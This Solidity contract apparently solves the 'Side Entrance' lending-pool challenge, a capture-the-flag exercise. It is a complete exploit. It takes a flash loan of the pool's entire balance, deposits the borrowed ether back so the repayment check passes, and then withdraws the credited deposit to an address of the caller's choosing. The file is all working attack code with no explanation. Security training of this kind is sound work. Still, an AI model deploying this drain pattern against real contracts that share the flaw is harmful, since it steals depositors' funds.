// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

interface ISideEntranceLenderPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract HackSideEntrance {

    ISideEntranceLenderPool public pool;

    constructor(address _pool) {
        pool = ISideEntranceLenderPool(_pool);
    }

    function hack() external {
        uint256 availableBalance = address(pool).balance;
        pool.flashLoan(availableBalance);
    }

    function execute() external payable {
        require(msg.sender == address(pool), "invalid caller");
        pool.deposit{value: msg.value}();
    }

    function withdrawFund(address to) external {
        pool.withdraw();
        payable(to).transfer(address(this).balance);
    }

    receive () external payable {}

}